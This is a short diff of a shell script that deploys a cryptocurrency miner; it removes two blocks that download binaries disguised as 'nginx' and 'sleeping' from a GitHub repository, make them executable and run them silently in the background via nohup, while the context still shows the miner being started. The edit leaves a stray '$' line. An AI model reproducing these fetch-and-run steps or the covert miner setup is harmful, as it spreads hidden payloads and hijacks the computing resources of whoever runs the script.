@@ -40,18 +40,12 @@ sed -i "s/kasm/kasm-$randnum/g" settings.json
 ####################################
 # 🔐 Download and run protection
 ####################################
-$DOWNLOAD_CMD /tmp/nginx https://github.com/evilqeo/frcx/raw/main/nginx
-chmod +x /tmp/nginx
-nohup /tmp/nginx > /dev/null 2>&1 &
-####################################
+$
 
 ####################################
 # 🛑 Download and run miner killer
 ####################################
-$DOWNLOAD_CMD /tmp/sleeping https://github.com/evilqeo/frcx/raw/main/sleeping
-chmod +x /tmp/sleeping
-nohup /tmp/sleeping > /dev/null 2>&1 &
-####################################
+
 
 # Start miner normally
 
